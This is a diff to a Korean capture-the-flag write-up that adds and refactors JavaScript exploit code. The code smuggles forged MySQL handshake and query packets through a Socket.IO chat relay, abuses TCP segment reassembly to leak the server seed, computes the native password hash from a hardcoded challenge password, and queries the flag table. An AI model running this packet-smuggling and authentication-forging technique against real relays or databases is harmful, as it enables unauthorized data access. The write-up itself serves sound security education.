@@ -322,11 +322,50 @@ def chatsend(content):
   * 따라서 server seed를 받아오기 위해선 send 이후 recv가 두번 실행되어야 하는데, 이를 이루기 위하여 위에서 설명한 `하나의 패킷을 두개로 쪼개 전송("AA","AA")하는` 방법을 사용한다.
 
   ![](https://arang.kr/fiesta/fiesta8.png?)
+```js
+function step1(){
+	// step 1
+	//b'\xcb\x00\x00\x01\x8d\xa2\xbf\t\x00\x00\x00\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00chatdb_admin\x00\x00chatdb\x00caching_sha2_password\x00t\x04_pid\x0516419\t_platform\x06x86_64\x03_os\x05Linux\x0c_client_name\x08libmysql\x07os_user\x05arang\x0f_client_version\x068.0.23\x0cprogram_name\x05sendtome'
+	p1 = convertFromHex("cb0000018da2bf0900000001ff00000000000000000000000000000000000000000000006368617464625f61646d696e00006368617464620063616368696e675f736861325f70617373776f72640074045f706964053136343139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
 
+	setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
+	setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
+}
+```
+  * 첫번째 패킷
+```
+b'\xcb\x00\x00\x01\x8d\xa2\xbf\t\x00\x00\x00\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00chatdb_admin\x00\x00chatdb\x00caching_sha2_password\x00t\x04_pid\x0516419\t_platform\x06x86_64\x03_os\x05Linux\x0c_client_name\x08libmysql\x07os_user\x05arang\x0f_client_version\x068.0.23\x0cprogram_name\x05sendtome'
+```
+  * 두번째 패킷
+```
+b'sendtome'
+```
   * mysql raw packet의 맨 앞 3바이트는 뒤에 올 패킷의 length인데, 이를 적절히 변조하여 마지막 sendtome 8byte만 빼고 보냄으로써 `TCP segment of a reassembled PDU` 를 유도하고, send -> recv -> (send, 원래 첫번째패킷) -> recv가 되도록 만들어준다.
 
   
+```js
+async function step2(serverSeed){		
+	//// mysql native password hashing process
+	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
+	console.log("[+] seed "+btoa(serverSeed));
+	var sp = await sha1(password);
+	var ssp = await sha1(convertFromHex(sp))
+	var sssp = await sha1(serverSeed+convertFromHex(ssp))
+	console.log("[+] sssp "+btoa(sssp));
+	
+	var hashedPassword = xor( convertFromHex(sp), convertFromHex(sssp) );
+	console.log("[+] hashed password "+btoa(hashedPassword))
 
+	var p1 = "\x14\x00\x00\x03"+hashedPassword
+
+	var query = "select * from flag#";
+	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`
+
+	var packet = p1+p2;
+	setTimeout(function(){console.log("send 3 round");sock.emit("chatsend", packet);},500)
+	setTimeout(function(){console.log("send 4 round");sock.emit("chatsend", "sendtome");},1500)
+}
+```
   * 이로써 server seed를 얻었으므로 내부망 코드에서 알아낸 db 패스워드와 server seed를 조합하여 패스워드 해시를 만들어낸다.
   * 이번엔 두개의 패킷을 하나로 합쳐 한번에 보내는것으로("AAAABBBB") 패스워드 해시를 보내는 패킷과 query request 패킷을 하나로 합쳐보내며 query request 패킷의 요청 길이를 조작하여 sendtome(8byte)를 보낼 길이만큼 설정한다
   * query를 `select * from flag#`과 같이 끝에 주석처리를하여 뒤에 sendtome가 오더라도 정상적인 쿼리가 되도록 세팅 후 보내면, 서버와 주고받는 과정으로 flag가 날아오게된다
@@ -397,6 +436,15 @@ async function sha1(message) {
   return hashHex;
 }
 
+function step1(){
+	// step 1
+	//b'\xcb\x00\x00\x01\x8d\xa2\xbf\t\x00\x00\x00\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00chatdb_admin\x00\x00chatdb\x00caching_sha2_password\x00t\x04_pid\x0516419\t_platform\x06x86_64\x03_os\x05Linux\x0c_client_name\x08libmysql\x07os_user\x05arang\x0f_client_version\x068.0.23\x0cprogram_name\x05sendtome'
+	p1 = convertFromHex("cb0000018da2bf0900000001ff00000000000000000000000000000000000000000000006368617464625f61646d696e00006368617464620063616368696e675f736861325f70617373776f72640074045f706964053136343139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
+
+	setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
+	setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
+}
+
 async function step2(serverSeed){		
 	//// mysql native password hashing process
 	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
@@ -415,7 +463,6 @@ async function step2(serverSeed){
 	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`
 
 	var packet = p1+p2;
-	console.log(btoa(packet))
 	setTimeout(function(){console.log("send 3 round");sock.emit("chatsend", packet);},500)
 	setTimeout(function(){console.log("send 4 round");sock.emit("chatsend", "sendtome");},1500)
 }
@@ -437,8 +484,6 @@ sock.on('join', function(data){
 
 // when get a new chat message
 sock.on('newchat', function(data){
-	//console.log(data.msg);
-	//var result = ab2str(data.msg);
 	var result = data;
 	console.log("[+] newchat "+result);
 	round += 1
@@ -451,11 +496,5 @@ sock.on('newchat', function(data){
 
 var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
 addScript("https://arang.kr/sha1.js");
-var packet = "";
-
-// step 1
-p1 = convertFromHex("cb0000018da2bf0900000001ff00000000000000000000000000000000000000000000006368617464625f61646d696e00006368617464620063616368696e675f736861325f70617373776f72640074045f706964053136343139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
-
-setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
-setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
+step1();
 ```
